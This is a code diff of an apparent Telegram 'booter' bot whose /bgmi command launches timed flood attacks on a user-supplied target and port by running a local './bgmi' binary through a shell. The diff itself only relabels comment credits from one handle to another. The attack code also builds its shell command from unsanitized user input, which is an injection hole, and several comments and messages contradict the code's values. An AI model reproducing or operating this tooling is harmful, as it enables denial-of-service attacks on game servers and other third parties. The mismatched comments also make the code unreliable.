@@ -287,7 +287,7 @@ def read_free_users():
         with open(FREE_USER_FILE, "r") as file:
             lines = file.read().splitlines()
             for line in lines:
-                if line.strip():  # @PrivateFileTg # Check if line is not empty
+                if line.strip():  # @iintrovertcoder # Check if line is not empty
                     user_info = line.split()
                     if len(user_info) == 2:
                         user_id, credits = user_info
@@ -307,7 +307,7 @@ def log_command(user_id, target, port, time):
     else:
         username = f"UserID: {user_id}"
     
-    with open(LOG_FILE, "a") as file:  # @PrivateFileTg # Open in "append" mode
+    with open(LOG_FILE, "a") as file:  # @iintrovertcoder # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
 
@@ -483,32 +483,32 @@ COOLDOWN_TIME =0
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # @PrivateFileTg # Check if the user is in admin_id (admins have no cooldown)
+        # @iintrovertcoder # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # @PrivateFileTg # Check if the user has run the command before and is still within the cooldown period
+            # @iintrovertcoder # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 20:
                 response = "You Are On Cooldown . Please Wait 2min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
-            # @PrivateFileTg # Update the last time the user ran the command
+            # @iintrovertcoder # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # @PrivateFileTg # Updated to accept target, time, and port
+        if len(command) == 4:  # @iintrovertcoder # Updated to accept target, time, and port
             target = command[1]
-            port = int(command[2])  # @PrivateFileTg # Convert time to integer
-            time = int(command[3])  # @PrivateFileTg # Convert port to integer
+            port = int(command[2])  # @iintrovertcoder # Convert time to integer
+            time = int(command[3])  # @iintrovertcoder # Convert port to integer
             if time > 240:
                 response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # @PrivateFileTg # Call start_attack_reply function
+                start_attack_reply(message, target, port, time)  # @iintrovertcoder # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 300"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # @PrivateFileTg # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # @iintrovertcoder # Updated command syntax
     else:
         response = " You Are Not Authorized To Use This Command ."
 
@@ -698,7 +698,7 @@ def log_command(user_id, target, port, time):
     else:
         username = f"UserID: {user_id}"
     
-    with open(LOG_FILE, "a") as file:  # @PrivateFileTg # Open in "append" mode
+    with open(LOG_FILE, "a") as file:  # @iintrovertcoder # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
 # @iintrovertcoder # Function to clear logs
